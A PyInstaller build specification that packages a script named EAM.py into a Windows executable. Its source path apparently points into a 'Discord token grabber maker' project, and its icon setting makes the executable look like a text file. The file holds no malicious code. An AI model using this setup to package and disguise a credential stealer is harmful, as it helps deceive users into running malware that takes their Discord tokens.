# -*- mode: python ; coding: utf-8 -*-


block_cipher = None


a = Analysis(['EAM.py'],
             pathex=['C:\\Users\\HesamPC\\Desktop\\developing\\discord\\sources\\Discord-Token-Grabber-maker - master\\discord token grabber maker\\files\\data'],
             binaries=[],
             datas=[],
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          [],
          exclude_binaries=True,
          name='EAM',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          console=True , icon='C:\\Users\\HesamPC\\Downloads\\txt-file-icon-1194-Windows.ico')
coll = COLLECT(exe,
               a.binaries,
               a.zipfiles,
               a.datas,
               strip=False,
               upx=True,
               upx_exclude=[],
               name='EAM')
